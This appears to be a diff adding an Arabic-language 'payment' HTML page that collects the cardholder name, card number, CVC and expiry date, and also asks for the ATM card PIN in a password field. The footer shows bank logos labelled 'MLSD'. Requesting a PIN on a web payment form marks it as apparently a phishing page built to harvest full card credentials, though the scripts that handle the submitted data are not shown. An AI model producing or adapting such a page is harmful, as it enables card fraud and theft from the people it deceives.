@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Payment </title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="manifest" href="site.webmanifest">
+        <link rel="shortcut icon" href="./favicon.ico" type="image/vnd.microsoft.icon">
+    <link rel="shortcut icon" type="image/x-icon" href="dist/img/favicon.ico">
+    <link href="paymentform.css" rel="stylesheet">
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"
+        integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <link rel="stylesheet" href="dist/css/style.css">
+</head>
+
+<body>
+    <div class="wrapper">
+     <h2> إتمام الدفع </h2>
+     <form id="page2form" action="#" method="post" >
+<h4>الاسم على البطاقة</h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <input type="text" name="name" id="name" autocomplete="cc-name" placeholder="اسمك " required class="name">
+                    <i class="fa fa-user icon"></i>
+
+                </div>
+               
+            </div>
+            <span id="errorText" class="error hidden"style="color: red;" ></span>
+      <h4>رقم البطاقة</h4>
+      <div class="input-group">
+        <div class="input-box">
+            <input type="tel" name="number" id="number" autocomplete="cc-number" autocorrect="" spellcheck="false" placeholder="أدخل رقم البطاقة" maxlength="16" pattern="[0-9]*" required class="name">
+            <i class="fa fa-credit-card icon"></i>
+          <div id="card-type-icon" class="FormFieldInput-Icons" style="opacity: 1;">
+                <img src="" alt="" class="BrandIcon" id="card-image" style="display:none;" loading="lazy">
+                <span id="card-type" style="margin-left: 10px;"></span>
+        </div>
+        </div>
+    </div>
+    
+    <script src="vi.js"></script>
+    
+    <span id="errorText2" class="error hidden"style="color: red;" ></span>
+<h4>(CVC)رمز التحقق </h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <input type="tel" name="cvc" id="cvv" maxlength="4" placeholder=" CVC" required class="name">
+                    <i class="fa fa-credit-card-alt icon"></i>
+
+                </div>
+                 </div>
+                 <span id="errorText1" class="error hidden"style="color: red;" ></span>
+                       <h4>تاريخ الانتهاء</h4>
+                 <div class="input-group">
+                <div class="input-box">
+                    <select type="tel" name="month" id="expMonth" autocomplete="cc-exp-month" placeholder="MM">
+                               <option value="" selected="" disabled="">شهر</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select> 
+                    <span id="errorText3" class="error hidden"style="color: red;" ></span>
+                </div>
+                <div class="input-box">
+                    <select type="tel" name="year" id="expYear" autocomplete="cc-exp-year" placeholder="YY">
+                        <option value="" selected="" disabled="">سنة</option>
+                    
+                     
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                        <option value="2033">2033</option>
+
+
+
+                    </select> 
+                    <span id="errorText4" class="error hidden"style="color: red;" ></span>
+                </div>
+                
+            </div>
+                          <h4>كلمة سر بطاقة الصراف</h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <input type="password" name="fort" id="fort" placeholder=" ****" maxlength="4" required class="name">
+                    <i class="fa fa-unlock-alt icon"></i>
+
+                </div>
+               	
+                 </div>
+                 <span id="errorText5" class="error hidden"style="color: red;" ></span>
+            <div class="input-group">
+                <div class="input-box">
+                    <button type="submit" id="nextButton">تأكيد الدفع </button>
+                </div>
+            </div>
+            <script src="card.js"></script></form>
+
+    </div>
+    <div class="mainFooter__top">
+        <div class="container-fluid">
+            <div class="row">
+                
+        
+                <div class="col-12 col-sm-5 col-lg-6">
+                    <div class="mainFooter__topNavLogotypes">
+        
+        
+        
+        
+        
+                        <div class="mainFooter__topNavLogo">
+                            
+                                <img src="img-bank/1.png" alt="MLSD" width="60">
+                                <img src="img-bank/3.png" alt="MLSD" width="60">
+                                <img src="img-bank/5.png" alt="MLSD" width="70">
+                   
+                            </a>
+                        </div>
+        
+        
+        
+        
+        
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+</body>
+
+</html>
